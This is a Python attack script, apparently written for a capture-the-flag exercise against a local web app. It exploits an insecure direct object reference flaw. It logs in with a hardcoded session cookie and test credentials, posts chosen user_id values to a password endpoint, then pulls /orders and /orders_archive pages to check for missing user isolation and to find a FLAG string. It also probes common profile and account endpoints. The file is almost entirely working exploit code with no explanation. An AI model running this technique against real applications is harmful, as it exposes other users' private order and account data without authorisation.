import requests
import re

base_url = "http://127.0.0.1:32942"
session_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVLYNw.IhYfNFCP9MtZmQqkMcC_IhVr21I"

print("[+] Testing IDOR vulnerability through discovered endpoints")
print("[+] Endpoints found in dashboard: /orders, /orders_archive")
print("[+] Testing if different user_id values affect data on these endpoints\n")

# Test if accessing user-specific endpoints shows different data
test_ids = [10020, 10032, 10045]
test_endpoints = ["/orders", "/orders_archive"]

all_findings = {}

for endpoint in test_endpoints:
    print(f"\n{'='*80}")
    print(f"[TESTING ENDPOINT]: {endpoint}")
    print(f"{'='*80}")
    
    endpoint_findings = {}
    
    for user_id in test_ids:
        session = requests.Session()
        session.cookies.set("session", session_cookie, domain="127.0.0.1", path="/")
        
        # Authenticate with the test user_id
        login_data = {"username": "test", "password": "test"}
        resp1 = session.post(f"{base_url}/", data=login_data)
        
        password_test_data = {"username": "test", "user_id": user_id, "password": "test"}
        resp2 = session.post(f"{base_url}/password/test", data=password_test_data)
        
        # Now access the endpoint
        resp3 = session.get(f"{base_url}{endpoint}")
        
        print(f"\n[User ID: {user_id}]")
        print(f"  Status: {resp3.status_code}")
        print(f"  Content Length: {len(resp3.content)} bytes")
        
        # Look for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', resp3.text)
        if flag_match:
            print(f"  [!] FLAG FOUND: {flag_match.group()}")
            print(f"  [!] Full Response: {resp3.text}")
        
        # Search for order-related data
        order_patterns = {
            'order_id': r'order[_\s-]?id[:\s=]\s*([0-9]+)',
            'order_number': r'order[_\s-]?number[:\s=]\s*([0-9a-zA-Z-]+)',
            'total': r'total[:\s=\$]\s*([0-9,\.]+)',
            'amount': r'amount[:\s=\$]\s*([0-9,\.]+)',
            'quantity': r'quantity[:\s=]\s*([0-9]+)',
            'status': r'status[:\s=]\s*([a-zA-Z]+)'
        }
        
        findings = {}
        for pattern_name, pattern_regex in order_patterns.items():
            matches = re.findall(pattern_regex, resp3.text, re.IGNORECASE)
            if matches:
                findings[pattern_name] = matches
        
        if findings:
            print(f"  [Data found]: {findings}")
        else:
            print(f"  [-] No order data patterns found")
        
        # Store full response for comparison
        endpoint_findings[user_id] = {
            'status': resp3.status_code,
            'content_length': len(resp3.content),
            'content': resp3.text,
            'findings': findings
        }
    
    all_findings[endpoint] = endpoint_findings

# Analyze differences between user_ids for each endpoint
print(f"\n{'='*80}")
print("[CROSS-USER ANALYSIS]")
print(f"{'='*80}\n")

for endpoint in test_endpoints:
    print(f"[Endpoint: {endpoint}]")
    
    endpoint_data = all_findings[endpoint]
    
    # Check if all responses are identical
    base_content = endpoint_data[test_ids[0]]['content']
    all_identical = True
    
    for user_id in test_ids[1:]:
        if endpoint_data[user_id]['content'] != base_content:
            all_identical = False
            print(f"  [-] user_id={user_id} response DIFFERS from baseline")
    
    if all_identical:
        print(f"  [!] ALERT: All responses IDENTICAL - No user isolation!")
    
    # Compare data findings
    print(f"  [Data Comparison]:")
    for user_id in test_ids:
        findings = endpoint_data[user_id]['findings']
        if findings:
            print(f"    user_id={user_id}: {findings}")
        else:
            print(f"    user_id={user_id}: No data found")

# Search for additional endpoints that might be user-specific
print(f"\n{'='*80}")
print("[EXPLORING FOR USER-SPECIFIC ENDPOINTS]")
print(f"{'='*80}\n")

# Try common user-specific endpoints
additional_endpoints = ["/profile", "/account", "/user", "/api/user", "/settings"]

for endpoint in additional_endpoints:
    print(f"[Testing]: {endpoint}")
    session = requests.Session()
    session.cookies.set("session", session_cookie, domain="127.0.0.1", path="/")
    
    # Authenticate
    resp1 = session.post(f"{base_url}/", data={"username": "test", "password": "test"})
    resp2 = session.post(f"{base_url}/password/test", data={"username": "test", "user_id": 10032, "password": "test"})
    
    # Try to access endpoint
    try:
        resp3 = session.get(f"{base_url}{endpoint}", timeout=5)
        if resp3.status_code != 404:
            print(f"  [+] Endpoint exists! Status: {resp3.status_code}")
            # Look for user-specific data
            flag_match = re.search(r'FLAG\{[^}]+\}', resp3.text)
            if flag_match:
                print(f"  [!!!] FLAG FOUND: {flag_match.group()}")
                print(f"  [!!!] Response: {resp3.text[:500]}")
        else:
            print(f"  [-] 404 Not Found")
    except Exception as e:
        print(f"  [-] Error: {str(e)}")
